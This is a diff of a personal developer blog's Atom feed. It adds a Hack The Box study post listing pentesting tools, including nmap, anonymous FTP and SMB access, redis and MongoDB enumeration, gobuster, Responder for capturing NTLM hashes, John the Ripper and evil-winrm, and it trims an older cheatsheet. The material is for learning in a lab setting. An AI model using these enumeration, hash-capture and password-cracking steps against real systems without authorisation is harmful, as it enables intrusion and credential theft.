@@ -1,4 +1,292 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="https://www.agalera.eu/feed.xml" rel="self" type="application/atom+xml" /><link href="https://www.agalera.eu/" rel="alternate" type="text/html" /><updated>2022-12-14T11:11:36+01:00</updated><id>https://www.agalera.eu/feed.xml</id><title type="html">Adrian Galera blog</title><subtitle>My personal developer blog page</subtitle><entry><title type="html">Python app structure</title><link href="https://www.agalera.eu/python-app-structure/" rel="alternate" type="text/html" title="Python app structure" /><published>2022-12-13T00:00:00+01:00</published><updated>2022-12-13T00:00:00+01:00</updated><id>https://www.agalera.eu/python-app-structure</id><content type="html" xml:base="https://www.agalera.eu/python-app-structure/">&lt;p&gt;Recently I was starting a Python application project from scratch and I had some issues understanding the correct project structure. Here’s what I have learnt.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.1">Jekyll</generator><link href="https://www.agalera.eu/feed.xml" rel="self" type="application/atom+xml" /><link href="https://www.agalera.eu/" rel="alternate" type="text/html" /><updated>2022-12-16T16:56:25+01:00</updated><id>https://www.agalera.eu/feed.xml</id><title type="html">Adrian Galera blog</title><subtitle>My personal developer blog page</subtitle><entry><title type="html">Pentesting tools</title><link href="https://www.agalera.eu/pentesting-tools/" rel="alternate" type="text/html" title="Pentesting tools" /><published>2022-12-16T00:00:00+01:00</published><updated>2022-12-16T00:00:00+01:00</updated><id>https://www.agalera.eu/pentesting-tools</id><content type="html" xml:base="https://www.agalera.eu/pentesting-tools/">&lt;p&gt;I have started playing around in &lt;a href=&quot;https://www.hackthebox.com/&quot;&gt;https://www.hackthebox.com&lt;/a&gt; platform and I’ll use this article to save all the pentesting tools I am learning.&lt;/p&gt;
+
+&lt;p&gt;&lt;!--more--&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;nmap&quot;&gt;nmap&lt;/h2&gt;
+
+&lt;p&gt;nmap is a port scanner tool. By default it scan ports from 0-1000.&lt;/p&gt;
+
+&lt;p&gt;You should pass the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-A&lt;/code&gt; flag which enables OS detection, version detection, script scanning, and traceroute:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap -A &amp;lt;ip&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;To enable only service version detection:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap -sV &amp;lt;ip&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;-sV flag does scanning and prints service and version on the found open port&lt;/p&gt;
+
+&lt;p&gt;To specify the default set of scripts for version identification use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-sC&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap -sC &amp;lt;ip&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;To scan all the ports, we need to specify this flags:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;namp -sV -p- --min-rate 1000 &amp;lt;ip&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Take into account that this operation will take a long time to complete.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--min-rate&lt;/code&gt; speeds up the process&lt;/p&gt;
+
+&lt;h2 id=&quot;telnet&quot;&gt;telnet&lt;/h2&gt;
+
+&lt;p&gt;Telnet is a very old way of connecting to computer and by default listens on port 23.&lt;/p&gt;
+
+&lt;p&gt;Usage:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;telnet &amp;lt;ip&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The prompty will ask for user/password:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;telnet &amp;lt;ip&amp;gt;
+Trying &amp;lt;ip&amp;gt;...
+Connected to &amp;lt;ip&amp;gt;.
+Escape character is &apos;^]&apos;.
+
+  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
+  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
+  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█
+
+
+Meow login: root
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;ftp&quot;&gt;ftp&lt;/h2&gt;
+
+&lt;p&gt;Stands for File transfer protocol. It listens on port 21 by deault and is unencrypted (the secure version is called sftp)&lt;/p&gt;
+
+&lt;p&gt;The first thing to try while trying to access ftp is user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;anonymous&lt;/code&gt; whitout password.&lt;/p&gt;
+
+&lt;p&gt;Commands:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt;: list directory contents&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pass&lt;/code&gt;: set passive mode&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;get&lt;/code&gt;: retrieve file to computer&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Examples&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ftp &amp;lt;ip&amp;gt;
+Connected to &amp;lt;ip&amp;gt;.
+220 (vsFTPd 3.0.3)
+Name (&amp;lt;ip&amp;gt;:gal): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&amp;gt; ls
+500 Illegal PORT command.
+ftp: bind: Address already in use
+ftp&amp;gt; pass
+Passive mode on.
+ftp&amp;gt; ls
+227 Entering Passive Mode (10,129,103,239,82,68).
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
+226 Directory send OK.
+ftp&amp;gt; get flag.txt /tmp/flag.txt
+local: /tmp/flag.txt remote: flag.txt
+227 Entering Passive Mode (10,129,103,239,159,232).
+150 Opening BINARY mode data connection for flag.txt (32 bytes).
+226 Transfer complete.
+32 bytes received in 0.00 secs (21.1291 kB/s)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;in order to use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; command, we need to set the Passive mode by issuing the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pass&lt;/code&gt; command&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;smb&quot;&gt;smb&lt;/h2&gt;
+
+&lt;p&gt;Stands for Server Message Block and is a protocol for file sharing between computers. It runs on port 445 by default.&lt;/p&gt;
+
+&lt;p&gt;The command line tool to interact with it, it’s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smbclient&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;To list shared directories:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbclient -L \\&amp;lt;ip&amp;gt;
+Enter WORKGROUP\gal&apos;s password:
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        WorkShares      Disk
+SMB1 disabled -- no workgroup available
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Note the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\\&lt;/code&gt; prefix, this comes from Windows slahes.&lt;/p&gt;
+
+&lt;p&gt;Now, let’s connect to the shared:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbclient \\\\&amp;lt;ip&amp;gt;\\WorkShares
+Enter WORKGROUP\gal&apos;s password:
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The commands to use once inside are the same as ftp&lt;/p&gt;
+
+&lt;h2 id=&quot;redis&quot;&gt;redis&lt;/h2&gt;
+
+&lt;p&gt;Redis is an in-memory key-value (NoSQL) database running on 6379 port by default&lt;/p&gt;
+
+&lt;p&gt;To connect to the database, we must use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;redis-cli&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;redis-cli -h &amp;lt;ip&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Once inside we can retrieve more information by using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;info&lt;/code&gt; command:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;ip&amp;gt;:6379&amp;gt; info
+# Server
+redis_version:5.0.7
+redis_git_sha1:00000000
+redis_git_dirty:0
+redis_build_id:66bd629f924ac924
+redis_mode:standalone
+os:Linux 5.4.0-77-generic x86_64
+arch_bits:64
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;To enumerate the database with some entries, we can use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;info keyspace&lt;/code&gt; command. This information is present in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;info&lt;/code&gt; response as well.&lt;/p&gt;
+
+&lt;p&gt;To retrieve all the keys in a given database, we can use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;keys *&lt;/code&gt; command once we have selected the database. To access a particular key, we use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;get&lt;/code&gt; command:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;redis-cli -h &amp;lt;ip&amp;gt;
+&amp;lt;ip&amp;gt;:6379&amp;gt; select 0
+OK
+&amp;lt;ip&amp;gt;:6379&amp;gt; keys *
+1) &quot;numb&quot;
+2) &quot;temp&quot;
+3) &quot;flag&quot;
+4) &quot;stor&quot;
+&amp;lt;ip&amp;gt;:6379&amp;gt; keys flag
+1) &quot;flag&quot;
+&amp;lt;ip&amp;gt;:6379&amp;gt; get flag
+&quot;flag&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;rdp&quot;&gt;rdp&lt;/h2&gt;
+
+&lt;p&gt;Stands for Remote Desktop Protocol and runs on port 3389.&lt;/p&gt;
+
+&lt;p&gt;To connect, you can use Windows tool or if in Linux, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xfreerdp&lt;/code&gt; or any other alternative.&lt;/p&gt;
+
+&lt;p&gt;If checking a Windows machine, try first the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Administrator&lt;/code&gt; user.&lt;/p&gt;
+
+&lt;h2 id=&quot;mongodb&quot;&gt;MongoDB&lt;/h2&gt;
+
+&lt;p&gt;MongoDB is a document based (NoSQL) database that runs by default on port 27017.&lt;/p&gt;
+
+&lt;p&gt;To connect to it, we should use the mongo shell, currently &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mongosh&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;To show all the database in the instance, use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;show dbs&lt;/code&gt; command.&lt;/p&gt;
+
+&lt;p&gt;To select a database: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;use &amp;lt;db&amp;gt;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;To show all the collections in a database use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;show collections&lt;/code&gt; commands.&lt;/p&gt;
+
+&lt;p&gt;To show contents of all the documents inside a collection use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;db.&amp;lt;collection&amp;gt;.find().pretty()&lt;/code&gt;. It will pretty print the results.&lt;/p&gt;
+
+&lt;p&gt;Example:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mongosh &amp;lt;ip&amp;gt;
+Current Mongosh Log ID: 63999d00a5b1f19a65a9d84b
+Connecting to:          mongodb://&amp;lt;ip&amp;gt;:27017/?directConnection=true&amp;amp;appName=mongosh+1.6.1
+Using MongoDB:          3.6.8
+Using Mongosh:          1.6.1
+
+For mongosh info see: https://docs.mongodb.com/mongodb-shell/
+
+test&amp;gt; show dbs
+admin                  32.00 KiB
+config                 72.00 KiB
+local                  72.00 KiB
+sensitive_information  32.00 KiB
+users                  32.00 KiB
+test&amp;gt; show collections
+
+test&amp;gt; use sensitive_information
+switched to db sensitive_information
+sensitive_information&amp;gt; show collections
+flag
+sensitive_information&amp;gt; db.flag.find().pretty()
+[
+  {
+    _id: ObjectId(&quot;630e3dbcb82540ebbd1748c5&quot;),
+    flag: &apos;flag&apos;
+  }
+]
+sensitive_information&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;rsync&quot;&gt;rsync&lt;/h2&gt;
+
+&lt;p&gt;rsync is a tool to share files between Linux machines, it defaults to SSH port (22) or 873.&lt;/p&gt;
+
+&lt;p&gt;With &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsync://&lt;/code&gt; will use 873 port while the form &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user@host&lt;/code&gt; will use the SSH port&lt;/p&gt;
+
+&lt;p&gt;To list all the rsync shares:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rsync --list-only rsync://&amp;lt;ip&amp;gt;
+public         	Anonymous Share
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;gobuster&quot;&gt;gobuster&lt;/h2&gt;
+
+&lt;p&gt;gobuster performs dir busting on a web server. It discovers available paths using a word list.&lt;/p&gt;
+
+&lt;p&gt;The following examples checks all the words in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share/dict/american-english-small&lt;/code&gt; dictionary and searches for paths with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;php&lt;/code&gt; extensions and stores the results in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp/found&lt;/code&gt; and uses 20 threads:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gobuster -x php -u http://&amp;lt;ip&amp;gt; -w /usr/share/dict/american-english-small -o /tmp/found -t 20  
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;responder&quot;&gt;Responder&lt;/h2&gt;
+
+&lt;p&gt;the responder tool: &lt;a href=&quot;https://github.com/lgandx/Responder&quot;&gt;https://github.com/lgandx/Responder&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;For getting NTLM password, responder tool will setup a rogue SMB server that will capture the challenge initiated by another machine in the network and store the hash of the challenge.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo responder -I tun0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;john-the-ripper&quot;&gt;John the ripper&lt;/h2&gt;
+
+&lt;p&gt;Password cracking tool. It does not do anything magic, it just compares a hash file with a list of words (dictionary). It has a quite decente default dictionary, however, you can search for more complete dictionaries such as the &lt;a href=&quot;https://www.google.com/url?sa=t&amp;amp;rct=j&amp;amp;q=&amp;amp;esrc=s&amp;amp;source=web&amp;amp;cd=&amp;amp;cad=rja&amp;amp;uact=8&amp;amp;ved=2ahUKEwi5noL2vP77AhXLXqQEHYafALkQFnoECA0QAQ&amp;amp;url=https%3A%2F%2Fgithub.com%2Fbrannondorsey%2Fnaive-hashcat%2Freleases%2Fdownload%2Fdata%2Frockyou.txt&amp;amp;usg=AOvVaw3snAERl1mU6Ccr4WFEazBd&quot;&gt;rock you&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Make sure to install a version &amp;gt;= 1.9.0, which enables support for many hash formats. In my case for 1.8.0 version I couldn’t crack a NTLMv2 hash.&lt;/p&gt;
+
+&lt;p&gt;You can find here &lt;a href=&quot;https://github.com/openwall/john&quot;&gt;https://github.com/openwall/john&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;evil-winrm&quot;&gt;evil-winrm&lt;/h2&gt;
+
+&lt;p&gt;Once you know the user/password of a Windows target, you can use &lt;a href=&quot;https://github.com/Hackplayers/evil-winrm&quot;&gt;evil-winrm&lt;/a&gt; to gain access to the shell.&lt;/p&gt;
+
+&lt;p&gt;The usage is quite easy:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;evil-winrm -i 10.129.67.87 -u Administrator -p &amp;lt;password&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;If you see some SSL error while connecting to the target make sure to enable support for legacy md4 hash:&lt;/p&gt;
+
+&lt;p&gt;Make sure the file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/ssl/openssl.cnf&lt;/code&gt; contains the following:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[provider_sect]
+default = default_sect
+legacy = legacy_sect
+
+[default_sect]
+activate = 1
+
+[legacy_sect]
+activate = 1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="linux" /><category term="hacking" /><category term="hack-the-box" /><category term="pentesting" /><category term="linux" /><category term="hacking" /><category term="hack-the-box" /><category term="pentesting" /><summary type="html">I have started playing around in https://www.hackthebox.com platform and I’ll use this article to save all the pentesting tools I am learning.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg" /><media:content medium="image" url="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Python app structure</title><link href="https://www.agalera.eu/python-app-structure/" rel="alternate" type="text/html" title="Python app structure" /><published>2022-12-13T00:00:00+01:00</published><updated>2022-12-13T00:00:00+01:00</updated><id>https://www.agalera.eu/python-app-structure</id><content type="html" xml:base="https://www.agalera.eu/python-app-structure/">&lt;p&gt;Recently I was starting a Python application project from scratch and I had some issues understanding the correct project structure. Here’s what I have learnt.&lt;/p&gt;
 
 &lt;p&gt;&lt;!--more--&gt;&lt;/p&gt;
 
@@ -264,235 +552,84 @@ pipx &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;dist/example_cli-0.0.
 
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;example-cli hello &lt;span class=&quot;nt&quot;&gt;--user&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;test
 &lt;/span&gt;2022-12-13T15:40:23.029Z | Hello &lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="python" /><category term="cli" /><category term="click" /><category term="python" /><category term="cli" /><category term="click" /><summary type="html">I have been developing an Python application to be able to be run as a CLI tool. In this article I speak about how I implement that using click library.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://www.agalera.eu/assets/img/posts/python-cli-app/featured.jpg" /><media:content medium="image" url="https://www.agalera.eu/assets/img/posts/python-cli-app/featured.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Hack the box cheatsheet</title><link href="https://www.agalera.eu/hack-the-box-cheatsheet/" rel="alternate" type="text/html" title="Hack the box cheatsheet" /><published>2022-12-12T00:00:00+01:00</published><updated>2022-12-12T00:00:00+01:00</updated><id>https://www.agalera.eu/hack-the-box-cheatsheet</id><content type="html" xml:base="https://www.agalera.eu/hack-the-box-cheatsheet/">&lt;p&gt;I have started playing around in &lt;a href=&quot;https://www.hackthebox.com/&quot;&gt;https://www.hackthebox.com&lt;/a&gt; platform and I’ll use this article to save all the things I am learning.&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="python" /><category term="cli" /><category term="click" /><category term="python" /><category term="cli" /><category term="click" /><summary type="html">I have been developing an Python application to be able to be run as a CLI tool. In this article I speak about how I implement that using click library.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://www.agalera.eu/assets/img/posts/python-cli-app/featured.jpg" /><media:content medium="image" url="https://www.agalera.eu/assets/img/posts/python-cli-app/featured.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Pentesting techniques</title><link href="https://www.agalera.eu/pentesting-techniques/" rel="alternate" type="text/html" title="Pentesting techniques" /><published>2022-12-12T00:00:00+01:00</published><updated>2022-12-12T00:00:00+01:00</updated><id>https://www.agalera.eu/pentesting%20techniques</id><content type="html" xml:base="https://www.agalera.eu/pentesting-techniques/">&lt;p&gt;I have started playing around in &lt;a href=&quot;https://www.hackthebox.com/&quot;&gt;https://www.hackthebox.com&lt;/a&gt; platform and I’ll use this article to save all the pentesting techniques I am learning.&lt;/p&gt;
 
 &lt;p&gt;&lt;!--more--&gt;&lt;/p&gt;
 
-&lt;h2 id=&quot;telnet&quot;&gt;telnet&lt;/h2&gt;
+&lt;h2 id=&quot;fingerprinting&quot;&gt;Fingerprinting&lt;/h2&gt;
 
-&lt;p&gt;Telnet is a very old way of connecting to computer and by default listens on port 23.&lt;/p&gt;
+&lt;p&gt;Once we got the target IP, we must start identifying which services is running in that machine. In order to do, you can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; which performs port scanning and is able to identify OS, services and service versions.&lt;/p&gt;
 
-&lt;p&gt;Usage:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;telnet &amp;lt;ip&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;The prompty will ask for user/password:&lt;/p&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;telnet &amp;lt;ip&amp;gt;
-Trying &amp;lt;ip&amp;gt;...
-Connected to &amp;lt;ip&amp;gt;.
-Escape character is &apos;^]&apos;.
-
-  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
-  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
-  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█
-
-
-Meow login: root
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;nmap&quot;&gt;nmap&lt;/h2&gt;
-
-&lt;p&gt;nmap is a port scanner tool. By default it scan ports from 0-1000.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap -sV &amp;lt;ip&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;-sV flag does scanning and prints service and version on the found open port&lt;/p&gt;
-
-&lt;p&gt;To scan all the ports, we need to specify this flags:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;namp -sV -p- -T5 &amp;lt;ip&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Take into account that this operation will take a long time to complete.&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-T5&lt;/code&gt; control the timeout to consider a port closed.&lt;/p&gt;
-
-&lt;h2 id=&quot;ftp&quot;&gt;ftp&lt;/h2&gt;
-
-&lt;p&gt;Stands for File transfer protocol. It listens on port 21 by deault and is unencrypted (the secure version is called sftp)&lt;/p&gt;
-
-&lt;p&gt;The first thing to try while trying to access ftp is user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;anonymous&lt;/code&gt; whitout password.&lt;/p&gt;
-
-&lt;p&gt;Commands:&lt;/p&gt;
-&lt;ul&gt;
-  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt;: list directory contents&lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pass&lt;/code&gt;: set passive mode&lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;get&lt;/code&gt;: retrieve file to computer&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Examples&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ftp &amp;lt;ip&amp;gt;
-Connected to &amp;lt;ip&amp;gt;.
-220 (vsFTPd 3.0.3)
-Name (&amp;lt;ip&amp;gt;:gal): anonymous
-331 Please specify the password.
-Password:
-230 Login successful.
-Remote system type is UNIX.
-Using binary mode to transfer files.
-ftp&amp;gt; ls
-500 Illegal PORT command.
-ftp: bind: Address already in use
-ftp&amp;gt; pass
-Passive mode on.
-ftp&amp;gt; ls
-227 Entering Passive Mode (10,129,103,239,82,68).
-150 Here comes the directory listing.
--rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
-226 Directory send OK.
-ftp&amp;gt; get flag.txt /tmp/flag.txt
-local: /tmp/flag.txt remote: flag.txt
-227 Entering Passive Mode (10,129,103,239,159,232).
-150 Opening BINARY mode data connection for flag.txt (32 bytes).
-226 Transfer complete.
-32 bytes received in 0.00 secs (21.1291 kB/s)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;in order to use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; command, we need to set the Passive mode by issuing the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pass&lt;/code&gt; command&lt;/li&gt;
-&lt;/ul&gt;
-
